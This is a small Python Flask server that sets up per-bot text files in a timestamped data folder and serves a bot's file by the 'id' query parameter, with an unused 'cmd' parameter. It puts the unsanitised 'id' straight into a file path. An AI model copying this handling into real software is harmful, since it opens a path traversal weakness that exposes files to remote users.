from flask import Flask, render_template, request
import shutil
import os
import time

app=Flask(__name__)
dir=''

@app.route('/')
def content():
	file = open('man.txt')
	text = file.read()
	return text

@app.route('/bot')
def handler():
	bot_id = request.args.get('id')
	cmd = request.args.get('cmd')
	filename = str(dir) + 'bot' + str(bot_id) + '.txt'
	print(filename)
	file = open(filename, 'r')
	data = file.read()
	#return render_template('content.html', text=data)
	return data+'\r\n'

@app.route('/init')
def init():
	timeStamp = time.strftime('%y%m%d%H%M%S')
	global dir
	dir = './data/'+timeStamp+'/'
	os.mkdir(dir)
	for i in range(11):
		filename = str(dir) + 'bot' + str(i) + '.txt'
		file = open(filename, 'w')
		file.write("")
		file.close()
	return 'System initialized. Data files will be written in '+str(dir)+'\r\n'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
